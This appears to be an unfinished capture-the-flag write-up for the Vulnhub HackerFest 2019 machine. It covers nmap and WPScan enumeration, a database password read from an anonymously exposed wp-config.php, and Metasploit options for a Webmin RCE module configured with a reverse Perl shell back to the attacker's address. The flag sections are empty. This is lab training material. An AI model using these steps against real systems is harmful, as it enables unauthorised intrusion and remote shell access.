Vulnhub - HackerFest 2019

# Vulnhub - HackerFest 2019

## Enumeration

- Started by enumerating box by using nmap with default parameters

  ```
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 23:36 -03                               
  Nmap scan report for 192.168.148.32                                                                                  
  Host is up (0.16s latency).                                                                                          
  Not shown: 996 closed ports                                                                                          
  PORT      STATE SERVICE  VERSION                                                                                     
  21/tcp    open  ftp      vsftpd 3.0.3                                                                                
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                               
  | -rw-rw-r--    1 ftp      ftp           420 Nov 30  2017 index.php                                                  
  | -rw-rw-r--    1 ftp      ftp         19935 Sep 05  2019 license.txt                                                
  | -rw-rw-r--    1 ftp      ftp          7447 Sep 05  2019 readme.html
  | -rw-rw-r--    1 ftp      ftp          6919 Jan 12  2019 wp-activate.php
  | drwxrwxr-x    9 ftp      ftp          4096 Sep 05  2019 wp-admin                 
  | -rw-rw-r--    1 ftp      ftp           369 Nov 30  2017 wp-blog-header.php
  | -rw-rw-r--    1 ftp      ftp          2283 Jan 21  2019 wp-comments-post.php
  | -rw-rw-r--    1 ftp      ftp          3255 Sep 27  2019 wp-config.php
  | drwxrwxr-x    8 ftp      ftp          4096 Feb 27  2020 wp-content
  | -rw-rw-r--    1 ftp      ftp          3847 Jan 09  2019 wp-cron.php
  | drwxrwxr-x   20 ftp      ftp         12288 Sep 05  2019 wp-includes                         
  | -rw-rw-r--    1 ftp      ftp          2502 Jan 16  2019 wp-links-opml.php
  | -rw-rw-r--    1 ftp      ftp          3306 Nov 30  2017 wp-load.php
  | -rw-rw-r--    1 ftp      ftp         39551 Jun 10  2019 wp-login.php
  | -rw-rw-r--    1 ftp      ftp          8403 Nov 30  2017 wp-mail.php
  | -rw-rw-r--    1 ftp      ftp         18962 Mar 28  2019 wp-settings.php
  | -rw-rw-r--    1 ftp      ftp         31085 Jan 16  2019 wp-signup.php
  | -rw-rw-r--    1 ftp      ftp          4764 Nov 30  2017 wp-trackback.php
  |_-rw-rw-r--    1 ftp      ftp          3068 Aug 17  2018 xmlrpc.php
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to 192.168.49.148
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 1
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  22/tcp    open  ssh      OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 b7:2e:8f:cb:12:e4:e8:cd:93:1e:73:0f:51:ce:48:6c (RSA)
  |   256 70:f4:44:eb:a8:55:54:38:2d:6d:75:89:bb:ec:7e:e7 (ECDSA)
  |_  256 7c:0e:ab:fe:53:7e:87:22:f8:5a:df:c9:da:7f:90:79 (ED25519)
  80/tcp    open  http     Apache httpd 2.4.25 ((Debian))
  |_http-generator: WordPress 5.2.3
  |_http-server-header: Apache/2.4.25 (Debian)
  |_http-title: Tata intranet &#8211; Just another WordPress site
  10000/tcp open  ssl/http MiniServ 1.890 (Webmin httpd)
  | http-robots.txt: 1 disallowed entry 
  |_/
  |_http-title: Login to Webmin
  | ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Linux-Debian
  | Not valid before: 2019-09-09T13:32:42
  |_Not valid after:  2024-09-07T13:32:42
  |_ssl-date: TLS randomness does not represent time
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  
  ```

- Interesting findings were made, most specifically on port 21/TCP (FTP), 80/TCP (HTTP) and port 1000/TCP

### Port 21/TCP - VSFTPD 3.0.3

- As shown by nmap, anonymous login to FTP is allowed, where some files, apparently from a previous wordpress installation were found. 

- By inspecting file wp-config.php, credentials of a database were retrieved

  ```
  // ** MySQL settings - You can get this info from your web host ** //                                     
  /** The name of the database for WordPress */                                                             
  define( 'DB_NAME', 'wordpress' );    
  
  /** MySQL database username */                                                                           
  define( 'DB_USER', 'wordpress' );                                                                                                                                                                              
  /** MySQL database password */                                                                           
  define( 'DB_PASSWORD', 'nvwtlRqkD0E1jBXu' );                                                             
  
  /** MySQL hostname */           
  define( 'DB_HOST', 'localhost' );
  ```

- The other files are pretty wordpress basic. so they were skipped.

### Port 80/TCP - Wordpress

- Once browsed to website, noticed that this is a wordpress install. Ran WPScan and enumerated the following information

  ```
  [...]
  
  [+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
   | Found By: Rss Generator (Passive Detection)
   |  - http://192.168.148.32/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
   |  - http://192.168.148.32/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
  
  [...]
  
  [i] User(s) Identified:
  
  [+] webmaster
   | Found By: Author Posts - Display Name (Passive Detection)
   | Confirmed By:
   |  Rss Generator (Passive Detection)
   |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
   
   [...]O
  ```

- Once this wordpress version hasn't any interesting vulnerability, skipped to port 1000/TCP to enumerate

### Port 10000/TCP

- Checking the version of the webmin service on port 10000/TCP, noticed that it contains a RCE vulnerability in a Metasploit Module

- By exploiting the vulnerability, the reverse shell was obtained

  ```
  msf5 exploit(linux/http/webmin_packageup_rce) > show options
  
  Module options (exploit/linux/http/webmin_packageup_rce):
  
     Name       Current Setting  Required  Description
     ----       ---------------  --------  -----------
     PASSWORD                    yes       Webmin Password
     Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOSTS     192.168.148.32   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
     RPORT      10000            yes       The target port (TCP)
     SSL        false            no        Negotiate SSL/TLS for outgoing connections
     TARGETURI  /                yes       Base path for Webmin application
     USERNAME                    yes       Webmin Username
     VHOST                       no        HTTP server virtual host
  
  
  Payload options (cmd/unix/reverse_perl):
  
     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST  192.168.49.148   yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port
  
  
  Exploit target:
  
     Id  Name
     --  ----
     0   Webmin <= 1.910
  
  ```

  

- 

## User Flag







## Root Flag